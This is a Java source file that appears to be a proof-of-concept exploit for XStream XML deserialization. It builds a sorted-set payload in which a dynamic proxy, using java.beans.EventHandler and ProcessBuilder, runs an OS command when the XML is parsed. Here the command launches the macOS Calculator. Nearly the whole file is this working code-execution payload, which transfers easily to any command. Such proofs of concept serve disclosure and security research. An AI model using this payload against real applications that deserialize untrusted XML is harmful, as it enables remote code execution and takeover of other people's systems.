package com.pwntester.xstreampoc;

import java.io.IOException;
import com.thoughtworks.xstream.XStream;
import com.thoughtworks.xstream.io.xml.DomDriver;
import java.beans.EventHandler;
import java.util.Set;
import java.util.TreeSet;

/**
 * Created with IntelliJ IDEA.
 * User: alvaro
 * Date: 23/12/13
 * Time: 13:39
 * To change this template use File | Settings | File Templates.
 */
public class Main {
    public static void main(String[] args) throws IOException {

        XStream xstream = new XStream(new DomDriver()) {{
                processAnnotations(Contact.class);
        }};

        Set<Comparable> set = new TreeSet<Comparable>();
        set.add("foo");
        set.add(EventHandler.create(Comparable.class, new ProcessBuilder("/Applications/Calculator.app/Contents/MacOS/Calculator"), "start"));
        //String payload2 = xstream.toXML(set);
        //System.out.println(payload2);

        String payload = "<sorted-set>" +
                "<string>foo</string>" +
                "<dynamic-proxy>" +
                "<interface>java.lang.Comparable</interface>" +
                "<handler class=\"java.beans.EventHandler\">" +
                " <target class=\"java.lang.ProcessBuilder\">" +
                " <command>" +
                " <string>/Applications/Calculator.app/Contents/MacOS/Calculator</string>" +
                " </command>" +
                " </target>" +
                " <action>start</action>" +
                "</handler>" +
                "</dynamic-proxy>" +
                "</sorted-set>";

        Contact c = (Contact) xstream.fromXML(payload);
    }
}
